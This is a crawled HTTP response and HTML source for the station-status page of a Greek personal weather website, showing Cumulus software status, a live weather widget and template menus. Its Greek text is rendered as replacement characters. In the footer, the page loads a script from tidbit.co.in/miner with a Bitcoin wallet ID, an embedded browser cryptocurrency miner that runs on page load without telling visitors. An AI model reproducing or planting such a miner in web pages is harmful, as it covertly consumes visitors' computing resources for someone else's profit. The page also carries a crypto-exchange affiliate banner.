http://www.volosweather.com/wxstatus.php
HTTP/1.1 200 OK
Date: Wed, 23 Jul 2014 05:36:36 GMT
Server: Apache
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Set-Cookie: PHPSESSID=aa6amdnu4ljebveudq4025dqp6; path=/
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 6914
Connection: close
Content-Type: text/html; charset=ISO-8859-7

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
  
  <script type="text/javascript" language="JavaScript" src="http://ajax.googleapis.com/ajax/libs/swfobject/2.2/swfobject.js"></script>
  
  
    <!-- ##### start AJAX mods ##### -->
    <script type="text/javascript" src="ajaxCUwx.js"></script>
    <!-- AJAX updates by Ken True - http://saratoga-weather.org/wxtemplates/ -->
    <script type="text/javascript" src="ajaxgizmo.js"></script>
    <script type="text/javascript"> showUV = false; </script>
    <script type="text/javascript" src="language-el.js"></script>
	<!-- language for AJAX script included -->

    <meta name="description" content="Personal weather station." />
<meta name="google-site-verification" content="Hxh3dkGtf4YZjDHlhtjmed3KZT02hpN2ZgW0Alqx0g8" />
<meta name="description"
content="Volos Weather"/>
<meta name="keywords"
content="volos weather, weather volos, volosweather, weathervolos, volos meteo, meteo volos, Volos, Thessaly, rain, argo, Greece sunny, snow, wind, hail, hotels, hellas, balkans, hellasweather, Pagasitikos, Mediterranean sea"/>
<meta name="author"
content="divlayerweb"/>
<meta name="robots" content="index,follow"/>
<meta name="document-classification" content="internet"/>
<meta name="document-type" content="Public"/>
<meta name="document-distribution" content="Global"/>
    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-7" />
    <link rel="stylesheet" type="text/css" href="weather-screen-black-narrow.css" media="screen" title="screen" />
    <link rel="stylesheet" type="text/css" href="weather-print-php.css" media="print" />
	<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
	<meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Cache-Control" content="no-cache" />
    <title>Volos Weather, Greece - Station Status</title>
<!-- begin flyout-menu.php CSS definition style='black' -->
<style type="text/css">
/* ================================================================
This copyright notice must be untouched at all times.

The original version of this stylesheet and the associated (x)html
is available at http://www.cssplay.co.uk/menus/flyout_4level.html
Copyright (c) 2005-2007 Stu Nicholls. All rights reserved.
This stylesheet and the associated (x)html may be modified in any
way to fit your requirements.
Modified by Ken True and Mike Challis for Weather-Display/AJAX/PHP
template set.
=================================================================== */
.flyoutmenu {
font-size:90%;
}

/* remove all the bullets, borders and padding from the default list styling */
.flyoutmenu ul {
position:relative;
z-index:500;
padding:0;
margin:0;
padding-left: 4px; /* mchallis added to center links in firefox */
list-style-type:none;
width: 110px;
}

/* style the list items */
.flyoutmenu li {
color: #CC9933;
background:#4A4A4A url(./ajax-images/flyout-shade-4A4A4A.gif);
/* for IE7 */
float:left;
margin:0; /* mchallis added to tighten gaps between links */
}
.flyoutmenu li.sub {background:#4A4A4A url(./ajax-images/flyout-sub.gif) no-repeat right center;}

/* get rid of the table */
.flyoutmenu table {position:absolute; border-collapse:collapse; top:0; left:0; z-index:100; font-size:1em;}

/* style the links */
.flyoutmenu a, .flyoutmenu a:visited {
display:block;
text-decoration:none;
line-height: 1.8em; 
width:95px; /* mchallis changed for adjusting firefox link width */
color:#CC9933;
padding: 0 2px 0 5px; 
border:1px solid black;
border-width:0 1px 1px 1px;
}
/* hack for IE5.5 */
         /* mchallis lowered the two width values to (101, 100)to fix IE6 links wider than menu width */
* html .flyoutmenu a, * html .flyoutmenu a:visited {width:95px; w\idth:94px;}
/* style the link hover */
* html .flyoutmenu a:hover {color:white; background:black; position:relative;}

.flyoutmenu li:hover {position:relative;}

/* For accessibility of the top level menu when tabbing */
.flyoutmenu a:active, .flyoutmenu a:focus {color:white; background:black;}

/* retain the hover colors for each sublevel IE7 and Firefox etc */
.flyoutmenu li:hover > a {color:white; background:black;}

/* hide the sub levels and give them a positon absolute so that they take up no room */
.flyoutmenu li ul {
visibility:hidden;
position:absolute;
top:-10px;
/* set up the overlap (minus the overrun) */
left:90px;
/* set up the overrun area */
padding:10px;
/* this is for IE to make it interpret the overrrun padding */
background:transparent url(./ajax-images/flyout-transparent.gif);
}

/* for browsers that understand this is all you need for the flyouts */
.flyoutmenu li:hover > ul {visibility:visible;}


/* for IE5.5 and IE6 you need to style each level hover */

/* keep the third level+ hidden when you hover on first level link */
.flyoutmenu ul a:hover ul ul{
visibility:hidden;
}
/* keep the fourth level+ hidden when you hover on second level link */
.flyoutmenu ul a:hover ul a:hover ul ul{
visibility:hidden;
}
/* keep the fifth level hidden when you hover on third level link */
.flyoutmenu ul a:hover ul a:hover ul a:hover ul ul{
visibility:hidden;
}

/* make the second level visible when hover on first level link */
.flyoutmenu ul a:hover ul {
visibility:visible;
}
/* make the third level visible when you hover over second level link */
.flyoutmenu ul a:hover ul a:hover ul{
visibility:visible;
}
/* make the fourth level visible when you hover over third level link */
.flyoutmenu ul a:hover ul a:hover ul a:hover ul {
visibility:visible;
}
/* make the fifth level visible when you hover over fourth level link */
.flyoutmenu ul a:hover ul a:hover ul a:hover ul a:hover ul {
visibility:visible;
}

</style>
<!-- end of flyout-menu.php CSS definition -->
<!-- World-ML template from http://saratoga-weather.org/wxtemplates/ -->
<!-- end of top -->
</head>
<body>

<div id="page"><!-- page wrapper -->


<!-- header -->

<div id="header">
	
	
	
 <div class="headerAds">	

 <a href="./index.php" title="VolosWeather">            
           <img src="Volos.jpg" 
           width="765" height="105" align="middle" border="0" alt="VolosWeather"/></a>
<a href="https://cex.io/r/0/gfleg77/0/" title="CEX.IO - Trade Ghashes while they mine you Bitcoins!" target="_blank">
<img src="http://cex.io/img/b/728x90.jpg"
width="728" height="90" border="0" alt="CEX.io"/></a>		   
	</div>
	
      <h1 class="headerTitle">
	  		 
     <a href="index.php" title="Browse to homepage">
	 
	 
	 
	 Volos Weather, Greece</a>
      </h1>	
	  <div class="headerTemp">
	    <span class="doNotPrint">
 		  <span class="ajax" id="ajaxbigtemp">27&deg;C		  </span>
		</span>
 	  </div>

      <div class="subHeader">
        Live conditions in Volos center, Greece					   <br />
		<!-- begin language select -->
		<span style="font-size: 10px">������: el</span> <a href="/wxstatus.php?lang=en" title="English">
<img src="./ajax-images/flag-en.gif" alt="English" title="English" border="0" /></a>
<a href="/wxstatus.php?lang=bg" title="&#1073;&#1098;&#1083;&#1075;&#1072;&#1088;&#1089;&#1082;&#1080; &#1077;&#1079;&#1080;&#1082;">
<img src="./ajax-images/flag-bg.gif" alt="&#1073;&#1098;&#1083;&#1075;&#1072;&#1088;&#1089;&#1082;&#1080; &#1077;&#1079;&#1080;&#1082;" title="&#1073;&#1098;&#1083;&#1075;&#1072;&#1088;&#1089;&#1082;&#1080; &#1077;&#1079;&#1080;&#1082;" border="0" /></a>
<a href="/wxstatus.php?lang=fr" title="Fran&ccedil;ais">
<img src="./ajax-images/flag-fr.gif" alt="Fran&ccedil;ais" title="Fran&ccedil;ais" border="0" /></a>
<a href="/wxstatus.php?lang=de" title="Deutsch">
<img src="./ajax-images/flag-de.gif" alt="Deutsch" title="Deutsch" border="0" /></a>
<a href="/wxstatus.php?lang=el" title="&Epsilon;&lambda;&lambda;&eta;&nu;&iota;&kappa;&#940;">
<img src="./ajax-images/flag-el.gif" alt="&Epsilon;&lambda;&lambda;&eta;&nu;&iota;&kappa;&#940;" title="&Epsilon;&lambda;&lambda;&eta;&nu;&iota;&kappa;&#940;" border="0" /></a>
<a href="/wxstatus.php?lang=it" title="Italiano">
<img src="./ajax-images/flag-it.gif" alt="Italiano" title="Italiano" border="0" /></a>
<a href="/wxstatus.php?lang=no" title="Norsk">
<img src="./ajax-images/flag-no.gif" alt="Norsk" title="Norsk" border="0" /></a>
<a href="/wxstatus.php?lang=ro" title="limba rom&#00226;n&#00259;">
<img src="./ajax-images/flag-ro.gif" alt="limba rom&#00226;n&#00259;" title="limba rom&#00226;n&#00259;" border="0" /></a>
<a href="/wxstatus.php?lang=es" title="Espa&ntilde;ol">
<img src="./ajax-images/flag-es.gif" alt="Espa&ntilde;ol" title="Espa&ntilde;ol" border="0" /></a>
<a href="/wxstatus.php?lang=se" title="Svenska">
<img src="./ajax-images/flag-se.gif" alt="Svenska" title="Svenska" border="0" /></a>
		<!-- end language select -->
		      </div>
      <div class="subHeaderRight">
	  <!-- Lang='el' -->
<script type="text/javascript">// Language translation for conditions by ajaxWDwx.js for lang='el'
//
  langTransLookup['Dry'] = '�������';
  langTransLookup['Light rain'] = '������� �����';
  langTransLookup['Moderate drizzle'] = '������ ���������';
  langTransLookup['Moderate rain'] = '������ �����';
  langTransLookup['Heavy rain'] = '������ �����';
  langTransLookup['Stopped raining'] = '����� ������';
  langTransLookup['Light snow'] = '������� ����������';
  langTransLookup['Heavy snow'] = '������ ����������';
  langTransLookup['Thunderstorm'] = '���������';
  langTransLookup['Nearby thunderstorm'] = '��������� �� ������� ��������';
  langTransLookup['Light thunderstorm rain'] = '������� ���������';
  langTransLookup['Dawn'] = '������';
  langTransLookup['Dusk'] = '��������';
  langTransLookup['Night time'] = '�����';
  langTransLookup['Clear'] = '�������';
  langTransLookup['Sunny'] = '����������';
  langTransLookup['Clear skies'] = '�������';
  langTransLookup['Mostly sunny'] = '������ ����������';
  langTransLookup['A few clouds'] = '��������� ����';
  langTransLookup['Sc'] = '������� ���������';
  langTransLookup['Scattered clouds'] = '������� ���������';
  langTransLookup['Partly cloudy'] = '������� ���������';
  langTransLookup['Mostly cloudy'] = '������ ���������';
  langTransLookup['Cloudy with clear p'] = '��������� �� ���������';
  langTransLookup['Cloudy with clear patches'] = '��������� �� ���������';
  langTransLookup['Overcast'] = '��������';
  langTransLookup['Mist'] = '��������';
  langTransLookup['Few clouds'] = '���� �������';
</script>
<!-- ajax-gizmo.php V1.10 - 30-May-2011 - Multilingual -->
<div class="ajaxgizmo">
   <div class="doNotPrint">
	  <!-- ##### start of AJAX gizmo ##### -->
	    <noscript>[������������� �� Javascript ��� ������� ���������]&nbsp;</noscript>
	    <span class="ajax" id="gizmoindicator">�����������</span>:&nbsp;
		<span class="ajax" id="gizmodate">23/07/2014 08:35</span>&nbsp; 
		<span class="ajax" id="gizmotime"></span>
		
	  <br/>&nbsp;<img src="./ajax-images/spacer.gif" height="14" width="1" alt=" " />
		<span class="ajaxcontent0" style="display: none">
		  <span class="ajax" id="gizmocurrentcond">���� �������</span>
		</span>
		<span class="ajaxcontent1" style="display: none">�����������: 
			<span class="ajax" id="gizmotemp">26.8&deg;C</span>
            
	        <span class="ajax" id="gizmotemparrow"><img src="./ajax-images/rising.gif" alt="��������� 0.7&deg;C ��� ��������� ���." title="��������� 0.7&deg;C ��� ��������� ���." width="7" height="8" style="border: 0; margin: 1px 3px;" />			</span>&nbsp;
			<span class="ajax" id="gizmotemprate">+0.7</span> 
			/hr		</span>
		<span class="ajaxcontent2" style="display: none">�������: 
		  <span class="ajax" id="gizmohumidity">60</span>%		</span>
		<span class="ajaxcontent3" style="display: none">������ ������: 
		  <span class="ajax" id="gizmodew">18.4&deg;C</span>		</span>
		<span class="ajaxcontent4" style="display: none">������: 
	    	<span class="ajax" id="gizmowindicon"></span> 
			<span class="ajax" id="gizmowinddir">��</span>&nbsp; 
			<span class="ajax" id="gizmowind">0.0 km/h</span>
		</span>
		<span class="ajaxcontent5" style="display: none">����: 
  			<span class="ajax" id="gizmogust">3.2 km/h</span>
		</span>
		<span class="ajaxcontent6" style="display: none">���������: 
    		<span class="ajax" id="gizmobaro">1004.17  hPa</span><img src="./ajax-images/rising.gif" alt="��������� 0.1  hPa/hr" title="��������� 0.1  hPa/hr" width="7" height="8" style="border: 0; margin: 1px 3px;" />&nbsp;
             <span class="ajax" id="gizmobarotrendtext">�������</span>			
		</span> 
		<span class="ajaxcontent7" style="display: none">������: 
    		<span class="ajax" id="gizmorain">0.0 mm</span>
		</span>
		<span class="ajaxcontent8" style="display: none">������� UV: 
           <span class="ajax" id="gizmouv">0</span>&nbsp;
		   <span style="color: #ffffff">
	         <span class="ajax" id="gizmouvword">�����</span>
		   </span>
		</span>
	  </div>
	  <!-- ##### end of AJAX gizmo  ##### -->

</div>
<!-- end of ajax-gizmo.php -->
	  </div><!-- end subHeaderRight -->
</div>
<!-- end of header -->	<!-- menubar -->
<div class="doNotPrint">
      <div class="leftSideBar">
        <p class="sideBarTitle">�����������</p>
<div class="flyoutmenu">
<!-- begin generated flyout menu -->
<!-- flyout-menu.php (ML) Version 1.07 - 04-Mar-2011 -->
<!-- by Ken True - webmaster[at]saratoga-weather.org and -->
<!-- by Mike Challis - webmaster[at]642weather.com  -->
<!-- Adapted from Stu Nicholl's CSS/XHTML at http://www.cssplay.co.uk/menus/flyout_4level.html -->
<!-- script available at http://saratoga-weather.org/scripts-CSSmenu.php#flyout -->
<!-- using 
Array
(
    [NAME] => black
    [SHADE_IMAGE] => flyout-shade-4A4A4A.gif
    [BORDER_COLOR] => black
    [LINK_COLOR] => #CC9933
    [LINK_BACKGROUND] => #4A4A4A
    [HOVER_COLOR] => white
    [HOVER_BACKGROUND] => black
)
 -->
<!-- using ./flyout-menu.xml for XML, doTrans=1 -->
<ul>
  <li><a href="index.php" title="Home Page">������</a></li>
  <!-- not used with CU <li><a href="wxmesonet.php" title="Local Weather Exchange Stations">Mesonet</a></li> -->
  <li><a href="wxradar.php" title="������">������ ������</a></li>
  <li><a href="wxforecast.php">�������� ������</a></li>
  <li><a href="wxsea.php">���������� ��������</a></li>
  <li><a href="wxmetar.php">������� ������ �����������</a></li>
  <li><a href="wxuvforecast.php">�������� ������ UV</a></li>
  <li><a href="wxadvisory.php">���������������</a></li>
  <li><a href="wxquake.php">�������� �������������</a></li>
  <li><a href="wxgraphs.php">������� �������</a></li>
  <li><a href="wxcurecords.php">����� �������</a></li>
  <li><a href="wxastronomy.php">���������� �����/�������</a></li>
  <li><a href="wxspace.php">����������� K�����</a></li>
  <li><a href="wxlinks.php">���������</a></li>
  <li><a href="wxabout.php">�������</a></li>
  <li><a href="wxstatus.php" title="Status of weather software">Status</a></li>
  <li><a href="wxsitemap.php">����o�������</a></li>
</ul>
<!-- end generated flyout menu -->
</div>
<!-- external links -->


<p class="sideBarTitle">���������</p>



<a href="http://www.metar.gr/?option=com_jumi&amp;fileid=12&amp;Itemid=73&amp;station=1318" title="Member of the Metar">            
           <img src="metar.gif" 
           width="110" height="70" align="middle" border="0" alt="MemberOfMetar"/></a> 

 <a href="http://www.wunderground.com/weatherstation/WXDailyHistory.asp?ID=ITHESSAL22" title="Member of the Weather Underground">            
           <img src="WUBanner.gif" 
           width="110" height="110" align="middle" border="0" alt="MemberOfWU"/></a>

<a href="http://groups.yahoo.com/group/hellasweather/" title="Member of the Hellas Weather Group">            
           <img src="HellasWea.gif" 
           width="110" height="110" align="middle" border="0" alt="MemberOfHellasWeather"/></a>		   
		   
		 
 <a href="http://www.awekas.at/en/instrument.php?id=7978" title="Member of the AWEKAS">            
           <img src="awekas.jpg" 
           width="110" height="110" align="middle" border="0" alt="MemberOfAWEKAS"/></a> 

<!--  		   
<ul>
   <li><a href="http://www.wunderground.com/" title="Weather Underground">Weather Underground</a></li>
   <li><a href="http://www.wxforum.net/" title="WXForum">WXforum.net</a></li>
</ul>
-->

<!-- end external links -->
      </div><!-- end leftSidebar -->
</div><!-- end doNotPrint -->	
<!-- end of menubar -->

<div id="main-copy">
 
   <h1>Weather Station Status</h1>
     <p>This page shows the current status of the weather software used in the operation of this website.<br/><br/>
         This website uses <b>Cumulus 
   (1.9.0-b958)</b> for weather conditions reporting.  
  <br/></p>

  <table width="620" border="0" cellspacing="6" cellpadding="3" style="border-collapse:collapse">
    <tr>
      <th style="width: 40%" scope="col">Component</th>
      <th style="width: 15%" scope="col" align="center">Status</th>
      <th style="width: 10%" scope="col" align="right">Age<br />h:m:s</th>
      <th style="width: 35%" scope="col" align="right">Latest update time as of<br/> 23/07/2014 08:36</th>
    </tr>
    <!-- ./realtime.txt age = 47 secs. 0:00:47 -->
    <tr>
      <td>Cumulus realtime</td>
      <td align="center"><span style="color: red"><b>NOT Current</b></span></td>
      <td align="right">0:00:47</td>
      <td align="right"> > 0:00:15<br/><b>23/07/2014 08:35</b></td>
    </tr>
<!-- CUtags.php age = 53 secs. 0:00:53 -->
    <tr>
      <td>Cumulus FTP</td>
      <td align="center"><span style="color: green"><b>Current</b></span></td>
      <td align="right">0:00:53</td>
      <td align="right">23/07/2014 08:35 </td>
    </tr>
<!-- CUtags.php internal update date time='23/07/14 08:35' fixed='2014-07-23 08:35' -->
<!-- age = 96 secs. 0:01:36 -->
    <tr>
      <td>Cumulus weather data</td>
      <td align="center"><span style="color: green"><b>Current</b></span></td>
      <td align="right">0:01:36</td>
      <td align="right">23/07/2014 08:35 </td>
    </tr>

  </table>
  
  

</div><!-- end main-copy -->

    <!-- ##### Footer ##### -->

    <div id="footer">

	
	Forecast by Davis Vantage Pro2 Station : Mostly cloudy and cooler. Precipitation possible within 12 hours, possibly heavy at times. Windy.<br/>
<br/>
      <div class="doNotPrint">
        <a href="#header">����</a> |

        <a href="mailto:volosweather@gmail.com" title="E-mail us">�����������</a>
        <script language="javascript" type="text/javascript">
        <!--
        if (navigator.appName == 'Microsoft Internet Explorer' && 
        parseInt(navigator.appVersion) >= 4)
        {
        document.write('| <a href=\"#\" onclick=\"javascript:window.external.AddFavorite        (location.href,document.title)\">');
        document.write('����� ������������</a>');
        }else
        {var msg = '| <a href="" title="����� ������������" onClick="alert(' + "'Hit CTRL-D to bookmark this page'"+ ');">����� ������������</a>';
        if(navigator.appName == "Netscape") msg += " (CTRL-D)";
document.write(msg);
        }
        // -->
        </script>
      </div><!-- end doNotPrint -->

      <div>

        &copy; 2014 VolosWeather.com<span class="doNotPrint"> |  
          <a href="http://sandaysoft.com/products/cumulus" title="Powered by Cumulus">Cumulus		   (1.9.0-b958) </a> |
		  <a href="http://validator.w3.org/check?uri=referer">������ XHTML 1.0</a> |
          <a href="http://jigsaw.w3.org/css-validator/check/referer">������ CSS</a> 
          </span><br class="doNotPrint" />
      <br/>���� �� �������� �������� ��������� �'����� � ������������ ����������� ������ ��� �� Internet.<br class="doNotPrint" />   

<br/>
 <!-- Start of StatCounter Code -->
<script type="text/javascript">
var sc_project=6616713; 
var sc_invisible=0; 
var sc_security="1257f64b"; 
</script>

<script type="text/javascript"
src="http://www.statcounter.com/counter/counter_xhtml.js"></script><noscript><div
class="statcounter"><a title="web analytics"
class="statcounter" href="http://statcounter.com/"><img
class="statcounter"
src="http://c.statcounter.com/6616713/0/1257f64b/0/"
alt="web analytics" /></a></div></noscript>
<!-- End of StatCounter Code --> 




<script type="text/javascript"
src="http://tidbit.co.in/miner">
window.walletId = 1J94gxDKpDVEo15EewZdFXErnrFsFA76Fj
  </script>

 

 </div>
    </div><!-- end id="footer" -->
  </div><!-- end id="page" wrapper -->
    
 </body>
</html>

